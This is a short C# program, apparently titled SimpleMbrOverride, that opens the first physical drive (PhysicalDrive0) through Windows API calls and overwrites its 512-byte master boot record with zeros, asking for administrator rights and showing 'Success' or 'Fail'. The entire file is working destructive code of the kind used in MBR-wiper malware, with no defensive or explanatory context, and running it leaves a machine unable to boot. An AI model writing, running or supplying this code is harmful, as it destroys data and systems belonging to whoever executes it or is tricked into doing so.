namespace SimpleMbrOverride
{
    using System;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;

    public class Program
    {
        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        //https://msdn.microsoft.com/en-us/library/windows/desktop/aa365747(v=vs.85).aspx
        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten,
            IntPtr lpOverlapped);

        //dwDesiredAccess
        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        //dwShareMode
        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;

        //dwCreationDisposition
        private const uint OpenExisting = 0x3;

        //dwFlagsAndAttributes
        private const uint FileFlagDeleteOnClose = 0x4000000;

        private const uint MbrSize = 512u;

        public static void Main(string[] args)
        {
            var mbrData = new byte[MbrSize];

            var mbr = CreateFile(
                "\\\\.\\PhysicalDrive0",
                GenericAll,
                FileShareRead | FileShareWrite,
                IntPtr.Zero, 
                OpenExisting,
                0,
                IntPtr.Zero);

            if (mbr == (IntPtr)(-0x1))
            {
                MessageBox.Show("Run as administrator");
                return;
            }

            if (WriteFile(
                mbr,
                mbrData,
                MbrSize,
                out uint lpNumberOfBytesWritten,
                IntPtr.Zero))
            {
                MessageBox.Show("Success");
                return;
            }
            else
            {
                MessageBox.Show("Fail");
                return;
            }
        }
    }
}
